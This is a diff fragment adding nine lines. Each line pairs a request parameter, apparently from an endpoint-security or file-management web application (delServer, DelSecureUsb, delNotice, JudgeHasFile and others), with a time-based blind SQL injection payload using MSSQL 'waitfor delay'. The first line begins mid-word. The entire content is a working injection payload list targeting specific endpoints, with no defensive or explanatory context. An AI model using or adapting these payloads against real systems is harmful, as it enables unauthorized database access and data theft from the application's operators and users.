@@ -1,0 +1,9 @@
+earch&groupNameSearch=-1'waitfor delay '0:0:5'--
+delServer&serverId=-1'waitfor delay '0:0:5'--
+isExist&logicGroupName=-1'waitfor delay '0:0:5'--
+DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:5'--
+delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:5'--
+delFileFormat&fileFormatId=-1'waitfor delay '0:0:5'--
+upPriority&id=-1'waitfor delay '0:0:5'--
+delNotice&noticeId=-1'waitfor delay '0:0:5'--
+JudgeHasFile&logicpath==-1'waitfor delay '0:0:5'--
